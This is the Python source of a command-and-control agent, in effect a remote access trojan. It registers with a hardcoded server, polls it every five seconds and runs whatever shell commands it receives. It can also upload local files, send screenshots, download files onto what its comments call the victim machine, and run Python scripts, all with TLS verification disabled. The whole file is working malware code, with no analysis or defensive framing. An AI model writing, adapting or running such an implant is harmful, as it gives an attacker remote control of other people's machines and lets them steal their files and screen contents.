import requests
import json
import os
import sys
import time
import subprocess
import shutil
import pyautogui
import urllib3
import base64
import socket

# Disable SSL warnings (for dev only!)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Server URL
#SERVER_URL = "https://127.0.0.1:5000"
#SERVER_URL = "https://172.29.67.1:5000"
SERVER_URL = "https://172.16.4.241:5000"
# Get agent name from command-line args (default = Agent1)
AGENT_NAME = socket.gethostname()
AGENT_FILE = f"{AGENT_NAME}_id.txt"


def register_agent():
    """Register this agent with the C2 server and store agent_id."""
    if os.path.exists(AGENT_FILE):
        with open(AGENT_FILE, "r") as f:
            agent_id = f.read().strip()
            # Verify agent_id exists on server
            try:
                res = requests.get(f"{SERVER_URL}/agents", verify=False)
                if res.status_code == 200:
                    agents = res.json()
                    if any(agent["id"] == agent_id for agent in agents):
                        print(f"[+] Agent already registered with ID: {agent_id}")
                        return agent_id
                    else:
                        print("[*] Agent ID not found in server DB. Re-registering.")
            except Exception as e:
                print(f"[-] Failed to verify agent ID: {e}")

    # Register new agent
    data = {"name": AGENT_NAME}
    response = requests.post(f"{SERVER_URL}/register", json=data, verify=False)

    if response.status_code == 201:
        agent_id = response.json()["agent_id"]
        print(f"[+] Registered new agent with ID: {agent_id}")

        with open(AGENT_FILE, "w") as f:
            f.write(agent_id)

        return agent_id
    else:
        print("[-] Failed to register agent:", response.text)
        return None


def execute_command(command, agent_id):
    """Execute shell commands or handle custom C2 features."""
    try:
        if command.startswith("upload "):
            # Upload local file to server
            filepath = command.split(" ", 1)[1].strip()
            if not os.path.exists(filepath):
                return f"File not found: {filepath}"

            with open(filepath, "rb") as f:
                files = {'file': f}
                response = requests.post(f"{SERVER_URL}/upload/{agent_id}",
                                         files=files, verify=False)

            return "Upload successful." if response.status_code == 200 else f"Upload failed: {response.text}"

        elif command == "screenshot":
            screenshot_path = f"screenshot_{agent_id}.png"
            pyautogui.screenshot(screenshot_path)

            with open(screenshot_path, "rb") as f:
                image_b64 = base64.b64encode(f.read()).decode()

            os.remove(screenshot_path)

            data = {"screenshot": image_b64}
            response = requests.post(f"{SERVER_URL}/screenshot/{agent_id}",
                                     json=data, verify=False)

            return "Screenshot sent." if response.status_code == 200 else f"Screenshot failed: {response.text}"

        elif command.startswith("download "):
            # Download file from server to victim machine
            parts = command.split(" ",2)
            if len(parts) != 3:
                return "Usage: download <server_url> <save_as>"
            url, save_as = parts[1], parts[2].strip('"')

            r = requests.get(url, verify=False, stream=True)
            if r.status_code == 200:
                with open(save_as, "wb") as f:
                    for chunk in r.iter_content(1024):
                        f.write(chunk)
                return f"Downloaded file as {save_as}"

            return f"Failed to download file: {r.status_code}"

        elif command.startswith("execpy "):
            script_path = command.split(" ", 1)[1].strip()
            if not os.path.isfile(script_path):
                return f"Script not found: {script_path}"
            result = subprocess.run(['python', script_path], capture_output=True, text=True)
            output = result.stdout if result.stdout else result.stderr
            return output.strip()

        else:
            # Default: system shell command
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout if result.stdout else result.stderr
            return output.strip()

    except Exception as e:
        return f"Execution error: {e}"


def send_result(agent_id, command_id, result):
    """Send command execution result back to server."""
    data = {"command_id": command_id, "result": result}
    response = requests.post(f"{SERVER_URL}/result/{agent_id}", json=data, verify=False)

    if response.ok:
        print(f"[+] Result sent for command {command_id}")
    else:
        print(f"[-] Failed to send result: {response.text}")


def poll_commands(agent_id):
    """Continuously poll server for new commands and execute them."""
    while True:
        try:
            response = requests.get(f"{SERVER_URL}/get_command/{agent_id}", verify=False)
            if response.status_code == 200:
                data = response.json()
                if "command" in data:
                    command_id = data["command_id"]
                    command = data["command"]
                    print(f"[+] New command received (ID {command_id}): {command}")

                    # Execute command
                    output = execute_command(command, agent_id)
                    print(f"[+] Command output:\n{output}")

                    # Send result back
                    send_result(agent_id, command_id, output)
                else:
                    print("[-] No new commands.")
            else:
                print(f"[-] Error polling: {response.text}")
        except Exception as e:
            print(f"[-] Exception: {e}")

        time.sleep(5)


if __name__ == "__main__":
    agent_id = register_agent()
    if agent_id:
        poll_commands(agent_id)
